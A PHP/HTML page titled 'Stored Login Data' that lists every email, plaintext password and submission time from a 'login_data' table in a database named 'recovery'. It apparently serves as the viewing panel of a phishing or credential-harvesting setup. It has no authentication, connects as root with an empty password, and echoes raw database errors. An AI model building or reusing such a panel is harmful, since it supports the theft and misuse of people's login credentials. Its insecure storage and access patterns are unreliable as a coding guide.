<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Stored Login Data</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    :root {
      --color-mintOk: #e4f2f2;
    }

    @font-face {
      font-family: "Figtree";
      src: url("/Figtree/static/Figtree-Regular.ttf") format("truetype");
      font-weight: 400;
      font-style: normal;
    }

    body {
      background-color: var(--color-mintOk);
      font-family: "Figtree", sans-serif;
    }
  </style>
</head>

<body class="min-h-screen py-10 px-6 bg-[var(--color-mintOk)]">
  <div class="max-w-6xl mx-auto">
    <h1 class="text-5xl font-bold text-center text-gray-800 mb-12">
      🔐 Stored Login Credentials
    </h1>

    <?php
    $host = 'localhost';
    $user = 'root';
    $password = '';
    $dbname = 'recovery';

    try {
      $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8", $user, $password);
      $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

      $stmt = $pdo->query("SELECT * FROM login_data ORDER BY submitted_at DESC");

      echo "<div class='grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6'>";
      while ($row = $stmt->fetch()) {
        echo "<div class='bg-white border border-gray-200 shadow-md rounded-2xl p-6'>";
        echo "<h2 class='text-xl font-semibold text-gray-800 mb-2'>📧 " . htmlspecialchars($row['email']) . "</h2>";
        echo "<p class='text-gray-700 mb-2'>🔑 Password: " . htmlspecialchars($row['password']) . "</p>";
        echo "<p class='text-sm text-gray-500'>⏰ Submitted: " . $row['submitted_at'] . "</p>";
        echo "</div>";
      }
      echo "</div>";
    } catch (PDOException $e) {
      echo "<p class='text-red-600 text-lg font-medium'>❌ Database error: " . $e->getMessage() . "</p>";
    }
    ?>
  </div>
</body>

</html>